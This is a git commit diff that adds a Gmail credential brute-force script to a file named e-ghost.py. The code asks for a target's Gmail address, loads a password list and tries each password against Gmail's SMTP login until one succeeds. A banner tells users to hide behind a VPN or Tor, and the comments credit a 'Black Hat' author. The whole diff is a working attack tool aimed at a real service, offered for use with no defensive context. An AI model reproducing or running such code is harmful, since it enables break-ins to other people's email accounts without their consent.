69d86629801cb3169c321961014c5544f3afc20e
~ Sanatani Ghost <166104224+SanataniGhost@users.noreply.github.com>
2024-09-24 21:03:41 +0530

    e-ghost.py
    Signed-off-by: ~ Sanatani Ghost  <166104224+SanataniGhost@users.noreply.github.com>

--- e-ghost.py
+++ e-ghost.py
@@ -99,3 +99,42 @@ last year
 * password : passworld.txt
 *************USE VPN OR TOR SERVICE********************
 ''')
+''')
+artwork()
+smtp = smtplib.SMTP("smtp.gmail.com", GMAIL_PORT)
+
+smtp.ehlo()
+smtp.starttls()
+
+user = input("While The Target Gmail Adress: ")
+pwd = input("Enter '0' to use the inbuilt passwords list \nEnter '1' to Add a custom password list\nOptions: ")
+
+if pwd == '0':
+    passswfile = "passworld.txt"
+
+elif pwd == '1':
+    print("\n")
+    passswfile = input("Name The File Path (For Password List):")
+
+else:
+    print("\n")
+    print("Invalid input! Terminaling...")
+    sys.exit(1)
+try:
+    passswfile = open(passswfile, "r")
+
+except Exception as e:
+    print(e)
+    sys.exit(1)
+
+for password in passswfile:
+    try:
+        smtp.login(user, password)
+
+        print("[+] Password Found %s" % password)
+        break
+
+    except smtplib.SMTPAuthenticationError:
+        print("[-] Pasword Is Wrong. %s " % password)
+        # Author  : Akash Black Hat
+        #thank you hackers
